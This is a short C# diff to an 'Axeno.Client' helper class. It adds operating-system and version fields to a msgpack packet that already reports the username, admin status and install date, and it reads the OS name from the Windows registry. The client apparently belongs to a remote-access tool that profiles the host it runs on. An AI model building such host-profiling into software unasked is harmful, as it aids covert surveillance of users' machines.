@@ -21,6 +21,9 @@ namespace Axeno.Client.Helper
             msgpack.ForcePathObject("Username").AsString = Environment.UserName.ToString();
             msgpack.ForcePathObject("Applevel").AsString = IsAdministrator();
             msgpack.ForcePathObject("Instdate").AsString = InstallDate();
+            msgpack.ForcePathObject("Operatingsystem").AsString = OperatingSystemInfo();
+            msgpack.ForcePathObject("Version").AsString = "v0.9.1";
+
             return msgpack.Encode2Bytes();
         }
         public static string InstallDate()
@@ -41,6 +44,14 @@ namespace Axeno.Client.Helper
 
 
         }
+        public static string OperatingSystemInfo()
+        {
+            RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion");
+            string pathName = (string)registryKey.GetValue("productName");
+            registryKey.Close();
+            return pathName;
+        }
+
         public static string IsAdministrator()
         {
             var identity = WindowsIdentity.GetCurrent();
